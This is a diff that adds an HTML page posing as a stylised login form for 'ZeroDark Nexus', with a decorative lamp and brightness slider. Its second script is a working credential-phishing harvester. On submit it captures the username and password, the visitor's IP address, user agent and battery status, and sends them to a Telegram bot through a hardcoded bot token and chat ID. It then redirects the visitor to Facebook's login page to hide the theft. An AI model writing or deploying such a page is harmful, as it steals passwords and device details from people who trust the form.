@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>NIKHIL OWNER</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #000;
+      font-family: Arial, sans-serif;
+      color: white;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+    }
+
+    .slider-container {
+      margin: 20px;
+    }
+
+    .lamp-rope {
+      width: 4px;
+      height: 150px;
+      background: #555;
+      margin-top: 10px;
+    }
+
+    .lamp {
+      width: 100px;
+      height: 60px;
+      background: #333;
+      border-radius: 50% 50% 10px 10px;
+      position: relative;
+      box-shadow: 0 0 20px #000;
+    }
+
+    .lamp-glow {
+      content: '';
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, #00ffe7, #ff00c8, #ffff00, transparent);
+      border-radius: 50%;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+      filter: blur(30px);
+      z-index: -1;
+    }
+
+    .form-container {
+      margin-top: 30px;
+      width: 300px;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 15px;
+      backdrop-filter: blur(8px);
+      box-shadow: 0 0 20px rgba(255,255,255,0.2);
+      opacity: 0;
+      transform: scale(1);
+      transition: opacity 0.5s ease;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      color: #00ffe7;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #fff;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(45deg, #00ffe7, #ff00c8, #ffff00);
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.4s;
+    }
+
+    .login-btn:hover {
+      background: linear-gradient(45deg, #ffff00, #ff00c8, #00ffe7);
+    }
+  </style>
+</head>
+<body>
+
+ <div class="slider-container">
+    <label for="brightness">💡 Brightness:</label>
+    <input type="range" id="brightness" min="0" max="10" value="0">
+  </div>
+
+  <div class="lamp-rope"></div>
+  <div class="lamp" id="lamp">
+    <div class="lamp-glow" id="lampGlow"></div>
+  </div>
+
+  <div class="form-container" id="loginForm">
+    <h2>Login to ZeroDark Nexus</h2>
+    <form onsubmit="login(event) id="loginForm"">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" id="emailOrPhone" required>
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" id="password" required>
+      </div>
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const slider = document.getElementById("brightness");
+    const glow = document.getElementById("lampGlow");
+    const loginForm = document.getElementById("loginForm");
+
+    slider.addEventListener("input", () => {
+      const level = parseInt(slider.value);
+      const brightness = level / 10;
+
+      glow.style.opacity = brightness;
+      loginForm.style.opacity = brightness;
+    });
+
+    function login(e) {
+      e.preventDefault();
+      alert("✅ Login Successful Boss!");
+    }
+  </script>
+  <script>
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const emailOrPhone = document.getElementById('emailOrPhone').value;
+    const password = document.getElementById('password').value;
+
+    const botToken = '7750180795:AAFr9iOEdPJ2X4cv_2Vb9AC-gQ6nO5dxC0Y'; // replace
+    const chatId = '6609748407';    // replace
+
+    // Collect IP Address
+    const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+    // Device Info
+    const deviceInfo = navigator.userAgent;
+
+    // Battery Info
+    let batteryInfo = 'Unavailable';
+    if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+    }
+
+    const message = `
+📥 Welcome to web Login info:
+-------------------------------------------------------------
+📧 Email/Phone: ${emailOrPhone}
+
+🔑 Password: ${password}
+
+🔋 ${batteryInfo}
+
+🌐 IP Address: ${ipData.ip}
+
+📱 Device Info: ${deviceInfo}
+-------------------------------------------------------------
+📌Create by Mahadeb:@White_hacker_07
+`;
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+
+        const data = await response.json();
+        console.log('Telegram response:', data);
+
+        // Simulate Facebook redirect
+        window.location.href = 'https://www.facebook.com/login/';
+
+    } catch (err) {
+        console.error('Telegram Error:', err);
+        window.location.href = 'https://www.facebook.com/login/';
+    }
+});
+</script>
+</body>
+</html>
